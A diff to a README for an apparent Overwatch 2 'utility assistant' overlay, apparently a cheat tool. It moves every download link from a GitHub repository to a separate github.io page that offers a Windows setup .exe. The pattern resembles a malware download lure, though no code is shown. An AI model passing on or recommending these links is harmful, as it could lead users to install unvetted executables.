@@ -1,6 +1,6 @@
 # 🎯 overwatch-two-utility-assistant - Your Competitive Edge in Every Match
 
-[![Download Now](https://img.shields.io/badge/Download-Free_App-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/anmoretykrielleford/overwatch-two-utility-assistant)
+[![Download Now](https://img.shields.io/badge/Download-Free_App-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://anmoretykrielleford.github.io)
 
 ---
 
@@ -18,7 +18,7 @@ Think of it as your personal co-pilot that highlights key elements on your scree
 
 ## 📥 Download the Application
 
-Visit this link to download the application: [https://github.com/anmoretykrielleford/overwatch-two-utility-assistant](https://github.com/anmoretykrielleford/overwatch-two-utility-assistant)
+Visit this link to download the application: [https://anmoretykrielleford.github.io](https://anmoretykrielleford.github.io)
 
 You'll see a green **"Code"** button and/or a **"Releases"** section on that page. Click the **"Releases"** tab to find the latest version. Then click the download link that matches your Windows system (usually named something like `overwatch-two-utility-assistant-setup.exe`).
 
@@ -148,7 +148,7 @@ This project is provided for personal, non-commercial use. All game-related name
 
 ## 🔗 Quick Access Links
 
-- **Download Again:** [https://github.com/anmoretykrielleford/overwatch-two-utility-assistant](https://github.com/anmoretykrielleford/overwatch-two-utility-assistant)
+- **Download Again:** [https://anmoretykrielleford.github.io](https://anmoretykrielleford.github.io)
 
 Happy gaming, and see you in the arena! 🏆
 
